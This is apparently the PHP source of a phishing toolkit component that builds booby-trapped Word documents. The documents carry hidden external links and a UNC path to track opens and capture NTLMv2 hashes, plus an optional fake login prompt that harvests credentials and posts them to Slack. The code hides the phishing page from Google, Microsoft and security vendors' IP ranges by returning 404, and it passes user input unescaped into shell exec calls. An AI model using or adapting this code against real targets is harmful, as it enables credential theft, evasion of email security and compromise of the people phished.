<?php

// Pulls in Required Connection Variables
require_once '../../config.txt';

// Enter Your Phishing URL Below
$url = $APIDomain."/phishingdocs";

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
//$ip = "52.59.102.42";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

// List of Orgs to be Blacklisted
$blockorgs = array("Google","Microsoft","Forcepoint","Mimecast","ZSCALER","Fortinet","Amazon","PALO ALTO","RIPE","McAfee","M247","Internap","AS205100","YISP","Kaspersky","Berhad","DigitalOcean","IP Volume","Markus","ColoCrossing","Norton","Datacamp Limited","Scalair SAS","NForce Entertainment","Wintek Corporation","ONLINE S.A.S.","WestHost","Labitat","Orange Polska Spolka Akcyjna","OVH SAS","DediPath","AVAST","GoDaddy","SunGard","Netcraft","Emsisoft","CHINANET","Rackspace","Selectel","Sia Nano IT","AS1257","Zenlayer","Hetzner","AS51852","TalkTalk Communications","Spectre Operations","VolumeDrive","Powerhouse Management","HIVELOCITY","SoftLayer Technologies","AS3356","AS855","AS7459","AS42831","AS61317","AS5089","Faction","Plusnet","Total Server","AS262997","AS852","Guanghuan Xinwang","AS174","AS45090","AS41887","Contabo","IPAX","AS58224","AS18002","HangZhou","Linode","AS6849","AS34665","SWIFT ONLINE BORDER","AS38511","AS131111","Telefonica del Peru","BRASIL S.A","Merit Network","Beijing","QuadraNet","Afrihost","Vimpelcom","Allstream","Verizon","HostRoyale","Hurricane Electric","AS12389","Packet Exchange","AS52967","AS45974","Fastweb","AS17552","Alibaba","AS12978","AS43754","CariNet","AS28006","Free Technologies","DataHata","GHOSTnet","AS55720","Emerald Onion","AS208323","AS6730","AS11042","AS53667","AS28753","AS28753","Globalhost d.o.o","AS133119","Huawei","FastNet","AS267124","BKTech","Optisprint","AS24151","Pogliotti","321net","AS4800","Kejizhongyi","SIMBANET","AS42926","Web2Objects","AS12083");

if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m)) {

// Content for Orgs to see on the Blacklist
//echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";
// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {

$dbname = "phishingdocs";

$uniqid = uniqid('', true);

ini_set('upload_max_filesize', '20M');
ini_set('post_max_size', '20M');
ini_set('max_input_time', 300);
ini_set('max_execution_time', 300);

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Set Slack Webhook URL
if(isset($_REQUEST['slackurl']) && $_REQUEST['slackurl'] != ""){$slackurl = $_REQUEST['slackurl'];
}
else
// ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
{$slackurl = $SlackIncomingWebhookURL;}
if(isset($_REQUEST['slackchannel']) && $_REQUEST['slackchannel'] != ""){$slackchannel = $_REQUEST['slackchannel']; $slackchannel = stripslashes($slackchannel);
}
$slackemoji = ":page_facing_up:";
$slackbotname = "DocBot";
// ------------------------ SET THIS MANUALLY ----------------------------------------------------------------------------------
$APIResultsURL = $APIDomain."/phishingdocs/results";
//$uniqueid = uniqid();

// Cleans up Input
$slackurl = str_replace('"', "", $slackurl);
$slackurl = str_replace("'", "", $slackurl);
$slackurl = filter_var($slackurl, FILTER_SANITIZE_URL);
$slackchannel = str_replace('"', "", $slackchannel);
$slackchannel = str_replace("'", "", $slackchannel);

// In Case Slack Tokens are Provided as Input, Create an Indirect Object Reference in the DB so it Isn't Available to the Target
$targetset = isset($_REQUEST['Target']);
if($targetset == 'false'){
$slackurl = mysqli_real_escape_string($conn, $slackurl);
$slackchannel = mysqli_real_escape_string($conn, $slackchannel);
//$uniqueid = mysqli_real_escape_string($conn, $uniqueid);

$sqlselect0 = "CALL CreateNotificationRef('Slack','$slackurl','$slackchannel');";
$resultselect0 = $conn->query($sqlselect0);

while($rowselect0 = $resultselect0->fetch_assoc()) {
$uniqueid = $rowselect0["UUID"];
}
}

//printf($conn->error);
$conn->close();

$conn0 = mysqli_connect($servername, $username, $password, $dbname);

// If the API is Receiving a Request, Get Slack Token for Alerting
if(isset($_REQUEST['id'])){
$id = mysqli_real_escape_string($conn0, stripslashes($_REQUEST['id']));

$id = str_replace('"', "", $id);
$id = str_replace("'", "", $id);
$id = filter_var($id, FILTER_SANITIZE_SPECIAL_CHARS);

$sqlgetslack = "CALL GetNotificationRef('$id');";
$resultgetslack = $conn0->query($sqlgetslack);

while($row = $resultgetslack->fetch_assoc()) {
if($row["API_Token"] != ""){$slackurl = $row["API_Token"];}
if($row["Channel"] != ""){$slackchannel = $row["Channel"];}
}
}

//printf($conn0->error);
$conn0->close();

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Grab the User Agent String (NOTE: browscap.ini must be downloaded and configured in php.ini)
$browser = get_browser($_SERVER['HTTP_USER_AGENT'], true);
//print_r($browser);

// Receives Required Parameters and Sets Variables
if(isset($_REQUEST['ip'])){$ip = $_REQUEST['ip'];}else{$ip = $_SERVER['REMOTE_ADDR'];}
if(isset($_SERVER['HTTP_USER_AGENT'])){$useragent = mysqli_real_escape_string($conn2, $_SERVER['HTTP_USER_AGENT']);}else{$useragent = "";}
if(isset($_REQUEST['target'])){$target = mysqli_real_escape_string($conn2, $_REQUEST['target']);}
if(isset($_REQUEST['org'])){$org = mysqli_real_escape_string($conn2, $_REQUEST['org']);}

// Makes Password Safe for DB
if(isset($target)){$target = stripslashes($target); $target = filter_var($target, FILTER_SANITIZE_SPECIAL_CHARS);}
if(isset($org)){$org = stripslashes($org); $org = filter_var($org, FILTER_SANITIZE_SPECIAL_CHARS);}
$ip = stripslashes($ip);
$ip = filter_var($ip, FILTER_SANITIZE_SPECIAL_CHARS);

if(isset($_REQUEST["id"]) || $_SERVER['REQUEST_METHOD'] == "OPTIONS"){

// Looks Up Recent Requests to Prevent Flooding
$sqlselect = "CALL CheckRecentlySubmitted('$ip','$target','$org');";
$resultselect = $conn2->query($sqlselect);

$i = 0;

while($row2 = $resultselect->fetch_assoc()) {
$i = $i + 1;
}

//printf($conn2->error);
$conn2->close();

$conn3 = mysqli_connect($servername, $username, $password, $dbname);

// If There Isn't a Recent (Within 10 Seconds) Similar Request..
if($i == 0){

$useragent = mysqli_real_escape_string($conn3, $useragent);
$useragent = stripslashes($useragent);

// Inserts Captured Information Into MySQL DB
if (isset($_REQUEST['auth']) || $_SERVER['REQUEST_METHOD'] == "OPTIONS"){

if (!isset($_SERVER['PHP_AUTH_USER'])) {

header('WWW-Authenticate: Basic realm="API"'); 
header('HTTP/1.0 401 Unauthorized'); 
echo "You need to enter a valid username and password."; 
exit; 
	
} else {

$basicauthuser = mysqli_real_escape_string($conn3,$_SERVER['PHP_AUTH_USER']);

$basicauthpw = mysqli_real_escape_string($conn3, $_SERVER['PHP_AUTH_PW']);

$basicauthpw = base64_encode($basicauthpw);

}
}
if(isset($id)){
if(isset($basicauthuser) && isset($basicauthpw)){
$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id','$basicauthuser','$basicauthpw');";
} else {
$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id','','');";
}
}
echo $sqlinsert;
$resultinsert = $conn3->query($sqlinsert);

//printf($conn3->error);
$conn3->close();

// Prepares Message for Slack
if($target != "" && $org != ""){

$message = "> Document opened by ".$target." at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target == "" && $org != ""){

$message = "> Document opened at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target != "" && $org == ""){

$message = "> Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target == "" && $org == ""){

}else{

// If Credentials are Posted via Basic Auth
if(isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'], $_REQUEST['auth'])){
$basicauthuser = $_SERVER['PHP_AUTH_USER'];

$basicauthpw = $_SERVER['PHP_AUTH_PW'];

if(!isset($org) || $org == ""){
	$org = "Somewhere";
}

$message = "> ".$target." just entered their credentials at ".$org."! (<".$APIResultsURL."?UUID=".$id."|".$basicauthuser.">)";

//$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
//echo $cmd;
//exec($cmd);

}

// Send to Slack
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

//echo $cmd;
exec($cmd);

}
}




}

else {

// If Not Receiving Document Phishing Requests.. Show Generate Options
?>
<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
<link rel="stylesheet" href="../w3.css">
<style>
textarea {
    width: 65%;
    white-space: normal;
    -moz-text-align-last: center; /* Firefox 12+ */
    text-align-last: center;
}
</style>
<TITLE>PhishAPI</TITLE>
<link rel="apple-touch-icon" sizes="57x57" href="../images/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="../images/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="../images/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="../images/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="../images/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="../images/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="../images/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="../images/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="../images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="../images/favicon/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="../images/favicon/favicon-16x16.png">
<link rel="manifest" href="../images/favicon/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="../images/favicon/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
</HEAD>
<BODY>
<FORM ACTION="../index.php" METHOD="GET">
  <div class="w3-dropdown-hover w3-right">
    <button class="w3-button w3-phishapi"><i class="fa fa-home fa-2x" aria-hidden="true" style="color: black;"></i> Home</button>
    <div class="w3-dropdown-content w3-bar-block w3-border" style="right:0">
      <a href="../index.php?fakesite=1" class="w3-bar-item w3-button"><i class="fa fa-user fa-1x" aria-hidden="true" style="color: black;"></i> Fake Portal</a>
      <a href="../phishingdocs/" class="w3-bar-item w3-button"><i class="fa fa-file-text fa-1x" aria-hidden="true" style="color: black;"></i> Weaponized Documents</a>
      <a href="../campaigns" class="w3-bar-item w3-button"><i class="fa fa-envelope fa-1x" aria-hidden="true" style="color: black;"></i> Email Campaigns</a>
	  <a href="https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html" class="w3-bar-item w3-button" target="_blank"><i class="fa fa-question-circle fa-1x" aria-hidden="true" style="color: black;"></i> Help / About</a>
	  </div>
  </div></FORM><br><br>
<FONT COLOR="#ffffff">
<?php
if(isset($_REQUEST['URL'])){

// Receives and Cleans Input From Create Payload Form
$URL = stripslashes($_REQUEST['URL']);
$Target = stripslashes($_REQUEST['Target']);
$Org = stripslashes($_REQUEST['Org']);


$URL = str_replace('"', "", $URL);
$URL = str_replace("'", "", $URL);
$Target = str_replace('"', "", $Target);
$Target = str_replace("'", "", $Target);
$Target = preg_replace('/[^a-zA-Z0-9 ]/', '', $Target);
$Org = str_replace('"', "", $Org);
$Org = str_replace("'", "", $Org);
$Org = preg_replace('/[^a-zA-Z0-9 ]/', '', $Org);


// Generates Payload
$cmdcleanup = "rm -rf /var/www/uploads/*;";
exec($cmdcleanup,$outputcleanup);
//var_dump($outputcleanup);

// File Upload Piece
$target_dir = "../../uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

// Check file size
if ($_FILES["fileToUpload"]["size"] > 15000000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
if ($_FILES["fileToUpload"]["size"] == 0) {
   //echo $_FILES["fileToUpload"]["size"];
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "docx" && $imageFileType != "") {
    echo "Sorry, only Word documents (docx) are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
//    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
//        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
//        echo "Sorry, there was an error uploading your file.";
    }
}

if($uploadOk == 1){

// If the a Document Template was Uploaded, Insert Payload
$cmd0 = "cp '/var/www/uploads/".(basename( $_FILES["fileToUpload"]["name"]))."' /var/www/uploads/Phishing.docx;";
//$cmd0 = escapeshellcmd($cmd0);
exec($cmd0,$output0);
//var_dump($output0);

$cmd1 = "python InjectPayload.py \"".(basename( $_FILES["fileToUpload"]["name"]))."\";";
//$cmd1 = escapeshellcmd($cmd1);
exec ($cmd1,$output1);
//var_dump($output1);

$cmd2 = "cd /var/www/uploads/ && unzip -o Phishing.docx;";
//$cmd2 = escapeshellcmd($cmd2);
exec ($cmd2,$output2);
//var_dump($output2);

if(isset($_REQUEST['basicauth'])){

$cmdchecksettings = "ls /var/www/uploads/word/_rels/ | grep 'settings.xml.rels'";
exec($cmdchecksettings,$outputchecksettings);
//var_dump($outputchecksettings);

if(isset($outputchecksettings[0])){

// If settings.xml.rels already exists, append template instead of replacing the file
//$cmdsettingsxmlrelsperms = "sudo chmod 777 /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml;";
//exec($cmdsettingsxmlrelsperms);

$settingsxmlrels = file_get_contents("/var/www/uploads/word/_rels/settings.xml.rels");

$posrels = strpos($settingsxmlrels, "</Relationships>");

$beforerels = substr($settingsxmlrels, 0, $posrels);

$settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
                        Target=\"URLVALUE/phishingdocs/REPLACEME\"
                        TargetMode=\"External\"/>";

$settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
$handlerels = fopen($settingsrelsfile, 'w') or die('Cannot open file:  '.$settingsrelsfile);
$datarels = $beforerels.$settingsrelspayload."</Relationships>";
fwrite($handlerels, $datarels);

} else {

$cmdbasicauthtemplate = "cp settings.xml.rels.TEMPLATE /var/www/uploads/word/_rels/settings.xml.rels;";
exec ($cmdbasicauthtemplate,$outputbasicauthtemplate);
echo $outputbasicauthtemplate;

}

$basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";

$cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmd15,$output15);
//var_dump($output15);

$domainonly = parse_url($URL, PHP_URL_HOST);

$cmdunc2 = "sed -i -e 's~UNCVALUE~".stripslashes($domainonly)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmdunc2,$outputunc2);
//var_dump($output18);

$cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmd18,$output18);
//var_dump($output18);

$settingsxml = file_get_contents("/var/www/uploads/word/_rels/settings.xml");

$pos = strpos($settingsxml, "<w:defaultTabStop");

$before = substr($settingsxml, 0, $pos);

$after = strstr($settingsxml, '<w:defaultTabStop', false);

$settingsfile = "/var/www/uploads/word/_rels/settings.xml";
$handle = fopen($settingsfile, 'w') or die('Cannot open file:  '.$settingsfile);
$data = $before."<w:attachedTemplate r:id=\"rId9999\"/>".$after;
fwrite($handle, $data);

}

$cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
//$cmd3 = escapeshellcmd($cmd3);
exec ($cmd3,$outputcmd2);
//var_dump($outputcmd2);

$cmd4 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
//$cmd4 = escapeshellcmd($cmd4);
exec($cmd4,$output4);
//var_dump($output4);

$domainonly = parse_url($URL, PHP_URL_HOST);

$cmd5 = 'sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($domainonly).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
//$cmd5 = escapeshellcmd($cmd5);
exec($cmd5,$output5);
//var_dump($output5);

$cmd6 = "cd /var/www/uploads/ && zip -r Phishing.docx word/;";
//$cmd6 = escapeshellcmd($cmd6);
exec($cmd6, $output6);
//var_dump($output6);

$cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/hosted/".$uniqid.".docx;";
//$cmd7 = escapeshellcmd($cmd7);
exec($cmd7, $output7);
//var_dump($output7);

} else {

// If a Template was NOT Uploaded, Create a Default Template for Them
$cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
//$cmd8 = escapeshellcmd($cmd8);
exec($cmd8,$output8);
//var_dump($output8);

$cmd14 = "cp settings.xml.rels.TEMPLATE word/_rels/settings.xml.rels;";
exec($cmd14,$output14);
//var_dump($output14);

if(isset($_REQUEST['basicauth'])){

$basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";

$cmd15 = "sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.rels;";
exec($cmd15,$output15);
//var_dump($output15);

$domainonly = parse_url($URL, PHP_URL_HOST);

$cmdunc3 = "sed -i -e 's~UNCVALUE~".stripslashes($domainonly)."~g' word/_rels/settings.xml.rels;";
exec($cmdunc3,$outputunc3);
//var_dump($output18);

$cmd18 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
exec($cmd18,$output18);
//var_dump($output18);

}

$domainonly = parse_url($URL, PHP_URL_HOST);

$cmdunc = "sed -i -e 's~UNCVALUE~".stripslashes($domainonly)."~g' word/_rels/document.xml.rels;";
//$cmd10 = escapeshellcmd($cmd10);
exec($cmdunc,$outputunc);
//var_dump($output10);

$cmd10 = "sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
//$cmd10 = escapeshellcmd($cmd10);
exec($cmd10,$output10);
//var_dump($output10);



$cmd11 = "sed -i -e 's~TARGETVALUE~".stripslashes($Target)."~g' word/_rels/document.xml.rels;";
//$cmd11 = escapeshellcmd($cmd11);
exec($cmd11,$output11);
//var_dump($output11);

$cmd12 = "sed -i -e 's~ORGVALUE~".stripslashes($Org)."~g' word/_rels/document.xml.rels;";
//$cmd12 = escapeshellcmd($cmd12);
exec($cmd12,$output12);
//var_dump($output12);

$cmdID = "sed -i -e 's~IDVALUE~".$uniqueid."~g' word/_rels/document.xml.rels;";
//$cmdID = escapeshellcmd($cmdID);
exec($cmdID,$outputID);
//var_dump($outputID);

$cmd13 = "zip -r Phishing.docx word/_rels/document.xml.rels";
//$cmd13 = escapeshellcmd($cmd13);
exec($cmd13,$output13);
//var_dump($output13);

$cmd16 = "zip -r Phishing.docx word/_rels/settings.xml.rels";
//$cmd13 = escapeshellcmd($cmd13);
exec($cmd16,$output16);
//var_dump($output16);

$cmd17 = "cp Phishing.docx hosted/".$uniqid.".docx";
exec($cmd17,$output17);    
//var_dump($output17);
    
}

$DocName = $uniqid.".docx";

?>
<CENTER>
<br>
<FONT COLOR="#FFFFFF">Download and Send the File Directly (as an attachment)..</FONT><BR><BR>
<form action="hosted/<?php echo $DocName; ?>" method="get">
<button class="btn" style="width:25%" type="submit"><i class="fa fa-download"></i> Download</button>
</form><BR>
<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use a Hyperlink and Host the Document Here</FONT><BR><BR>
<?php 
$urischemelink = "<a href=\"ms-word:ofv|u|".$APIDomain."/phishingdocs/hosted/".$DocName."\">YOUR HYPERLINK TEXT</a>";
echo "<textarea class=\"js-emaillink\">".htmlspecialchars($urischemelink)."</textarea>";
?>

<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>

<script>
var copyEmailBtn = document.querySelector('.js-emailcopybtn');  
copyEmailBtn.addEventListener('click', function(event) {  
  // Select the email link anchor text  
  var emailLink = document.querySelector('.js-emaillink');  
  var range = document.createRange();  
  range.selectNode(emailLink);  
  window.getSelection().addRange(range);  

  try {  
    // Now that we've selected the anchor text, execute the copy command  
    var successful = document.execCommand('copy');  
    var msg = successful ? 'successful' : 'unsuccessful';  
    console.log('Copy email command was ' + msg);  
  } catch(err) {  
    console.log('Oops, unable to copy');  
  }  

  // Remove the selections - NOTE: Should use
  // removeRange(range) when it is supported  
  window.getSelection().removeAllRanges();  
});
</script>

</CENTER>
<?php

}
else {
// If the API Isn't Receiving Requests from a Doc Already, Display Form to Create One
?>
<FORM METHOD="POST" ACTION="<?php echo $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
<CENTER>
<FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
<TABLE>
<TR>
<TH>API URL</TH><TH>Target</TH><TH>Organization</TH><TH>Payloads</TH><TH COLSPAN="2">Slack Settings<br>(Not Required)</TH>
</TR>
<TR>
<TD><input type="text" name="URL" value="<?php echo $APIDomain;?>"></TD><TD><input type="text" name="Target" value="Joe Smith" size="10"></TD><TD><input type="text" name="Org" value="Evil Corp" size="10"></TD><TD><font size="2">HTTP Call </font><input type="checkbox" disabled checked><br><font size="2">SMB Hash </font><input type="checkbox" disabled checked><br><font size="2">Auth Prompt <input type="checkbox" name="basicauth"></font></TD><TD align="center" style="vertical-align:bottom"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br><FONT SIZE="2">Not Required if Set in Conf</font></TD><TD align="center" style="vertical-align:bottom"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br><font size="2">Not Required if Set in Conf</font></TD>
</TR>
<TR>
<TD COLSPAN="7">
<i>(<b>Optional</b> - Weaponize Your Own Document!)<i><br><br>
<input type="file" name="fileToUpload" id="fileToUpload">
</TD>
</TR>
</TABLE>
<br><br><button class="btn" type="submit"><i class="fa fa-download"></i> Generate Payload!</button>
</CENTER><br><br>
<FONT SIZE="3" COLOR="#ffffff"><p align="center">The generated Word doc will call back via HTTP to the Slack API specified in the API's php file.  Also, a UNC path will be created as well in an attempt to capture NTLMv2 SMB requests.  Make sure your server allows TCP 445 and you're running Responder when the documents are opened for added fun! :)</p></FONT>
</FORM>

<?php

}

?>

</BODY>
</FONT>
</HTML>
<?php
}
$allowed = "- *Accessed Phishing Site* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' '.$SlackIncomingWebhookURL.'';

// UNCOMMENT THIS IF YOU WANT ALERTS WHEN PEOPLE VISIT THE API
//exec($cmd);

?>
